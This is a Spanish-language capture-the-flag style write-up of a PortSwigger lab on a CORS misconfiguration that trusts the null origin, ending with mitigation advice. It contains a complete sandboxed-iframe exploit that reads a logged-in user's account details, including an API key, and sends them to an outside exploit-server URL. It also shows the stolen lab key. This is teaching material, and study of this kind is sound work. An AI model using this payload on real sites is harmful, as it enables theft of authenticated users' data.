# Lab: CORS vulnerability with trusted null origin

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

![Practitioner](https://img.shields.io/badge/level-Apprentice-green) 

---

Iniciamos el laboratorio y nos encontramos con una aplicaci√≥n de compras online:
![image](https://github.com/user-attachments/assets/91903113-dba9-47f7-946f-b978688cbf98)

Sabemos que el laboratorio tiene una configuraci√≥n CORS insegura que conf√≠a en origin null, tenemos que crear un script que nos devuelva la API key del administrador, por lo que tenemos que encontrar un endpoint que nos devuelva nuestra API key.

Procedemos a autenticarnos con nuestras credenciales `wiener:peter`:
![image](https://github.com/user-attachments/assets/f627e5ec-a806-4a02-b465-9dad19c47a77)

Dashboard del usuario:
![image](https://github.com/user-attachments/assets/36df1afa-6c74-4564-9b8e-53d8dbcecfd7)

Endpoint `/accountDetails`:
![image](https://github.com/user-attachments/assets/b2f8f53b-f33b-4c18-a1a2-ccd00dc6370a)

Hasta ahora este laboratorio es muy similar al anterior, este √∫ltimo endpoint nos devuelve un mont√≥n de informaci√≥n sensible relativa al usuario, incluyendo su API key.

El servidor nos devuelve la cabecera `Access-Control-Allow-Credentials: true`, por lo que sabemos que est√° haciendo uso del protocolo `CORS`. Enviamos esta petici√≥n al `Repeater`:
![image](https://github.com/user-attachments/assets/dad8d53b-62f8-4f7e-993a-4ab78cd18049)


Por lo que procedemos a testear la configuraci√≥n del protocolo para validar si hay vulnerabilidad.

Inyectamos el header `Origin` para validar si el servidor acepta or√≠genes arbitrarios:
![image](https://github.com/user-attachments/assets/2efabe9f-16d0-40e6-ae12-e94228aed593)

No nos refleja el header por lo que en este laboratorio el servidor no acepta or√≠genes arbitrarios.

Procedemos a testear si el servidor acepta la cabecera con el valor `Origin: null`:
![image](https://github.com/user-attachments/assets/7b84f93f-c845-49ac-b50f-2c6813ce560f)

Recibimos la cabecera `Access-Control-Allow-Origin: null` como respuesta del servidor.

El servidor est√° aceptando espec√≠ficamente el origen null, lo cual podr√≠a permitir a un atacante robar datos sensibles desde un origen sin dominio definido.

Este es el caso ideal para explotar usando el `iframe` con `data: URI` que analizamos antes en la teor√≠a:
```html
<html>
  <body>
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
      <script>
        var req = new XMLHttpRequest();
        req.onload = function() {
          location='https://exploit-0a95009f0337aa9e807d02b401d9008e.exploit-server.net/exploit/log?key=' + encodeURIComponent(this.responseText);
        };
        req.open('GET', 'https://0ae000f70321aaea801903e8001e00fd.web-security-academy.net/accountDetails', true);
        req.withCredentials = true;
        req.send();
      </script>
    ">
    </iframe>
  </body>
</html>
```

## üîß An√°lisis del exploit CORS usando `<iframe srcdoc>`

Este exploit est√° dise√±ado para aprovechar una configuraci√≥n vulnerable de CORS que acepta `Origin: null` y permite credenciales. Utiliza un iframe con `sandbox` y `srcdoc` para ejecutar un script desde un origen no confiable.


---

### üîé Desglose del funcionamiento

#### 1. `<iframe ...>`

Se crea un iframe aislado del documento principal, pero con permisos limitados especificados por `sandbox`.

#### 2. `sandbox="allow-scripts allow-top-navigation allow-forms"`

Permite:

* `allow-scripts`: ejecutar c√≥digo JavaScript dentro del iframe.
* `allow-top-navigation`: redireccionar la p√°gina superior mediante `location=`.
* `allow-forms`: enviar formularios (aunque no es esencial para este exploit).

El sandbox impide que el iframe herede el origen del documento principal, por lo que el `Origin` de las solicitudes realizadas ser√° `null`.

#### 3. `srcdoc="..."`

* Incrusta directamente contenido HTML dentro del iframe (una mini p√°gina con su propio DOM).
* Es m√°s confiable que `src="data:text/html,..."` y mantiene el `Origin: null`.

#### 4. Script embebido

* Realiza una solicitud con `XMLHttpRequest` al endpoint vulnerable (`/accountDetails`).
* Usa `withCredentials = true` para incluir cookies del usuario autenticado.
* Al recibir la respuesta (la API key del administrador), redirecciona el navegador hacia el exploit server, incluyendo los datos robados como par√°metro.

```javascript
location='https://exploit-server/log?key=' + encodeURIComponent(this.responseText);
```

---

### ‚ö†Ô∏è Condiciones necesarias para que funcione

* El servidor vulnerable debe aceptar:

  ```http
  Access-Control-Allow-Origin: null
  Access-Control-Allow-Credentials: true
  ```
* El navegador debe permitir iframes con `srcdoc` (lo hacen todos los modernos).
* El exploit debe ejecutarse desde un origen externo (como el exploit server de PortSwigger).

---

Simulamos levantar el servidor con nuestra p√°gina maliciosa haciendo click en `Go te exploit server` y pegando nuestro script en el campo `Body`. Luego hacemos click en `Deliver exploit to victim` para simular que la v√≠ctima accede a nuestro servidor y su navegador ejecuta el script:
![image](https://github.com/user-attachments/assets/c3a69524-42a6-440d-9282-979749f56828)


Accedemos a nuestros logs mediante el bot√≥n `Access log`:
![image](https://github.com/user-attachments/assets/4c19243c-303f-4f4f-b204-cc2b07b952c6)

Obtenemos la API key del usuario `administrator`:
```http
JUxIIWqGOQxTgD7euX8KWwilYehFwZkT
```

Procedemos a cargar la API key y resolver el laboratorio:
![image](https://github.com/user-attachments/assets/1195f74d-e44b-4ffe-b54e-aae0fe468ced)

---

## ‚úÖ Conclusiones

Este laboratorio expone c√≥mo una configuraci√≥n insegura de CORS que acepta el origen especial `null` puede ser explotada para robar informaci√≥n sensible de usuarios autenticados.  
El uso de un `iframe` con `srcdoc` permite generar solicitudes con `Origin: null`, y si el servidor responde con `Access-Control-Allow-Origin: null` y `Access-Control-Allow-Credentials: true`, el navegador entrega las cookies de sesi√≥n del usuario al atacante.

---

## üõ°Ô∏è Recomendaciones

Para mitigar este tipo de vulnerabilidades:

- **Nunca permitir `Access-Control-Allow-Origin: null`** a menos que haya una necesidad muy espec√≠fica y segura.
- Validar expl√≠citamente el origen en el backend usando una lista blanca de or√≠genes confiables.
- Evitar el uso de `Access-Control-Allow-Credentials: true` si no es estrictamente necesario.
- Aplicar pol√≠ticas de seguridad en el navegador como `SameSite` en cookies y `Content-Security-Policy` restrictiva.

---

## üìö Lecciones aprendidas

- El origen `null` no representa un dominio arbitrario, sino que se genera en contextos como `srcdoc`, `file://`, `data:`, o `sandbox` sin `allow-same-origin`.
- Los ataques CORS no dependen de vulnerabilidades del frontend, sino de **configuraciones inseguras en el backend**.
- El uso de t√©cnicas como `iframe + sandbox + srcdoc` permite ejecutar scripts desde or√≠genes no confiables de forma completamente funcional en navegadores modernos.
- Las pruebas de CORS deben incluir escenarios menos obvios como `Origin: null`, no solo reflejo directo de or√≠genes arbitrarios.

---


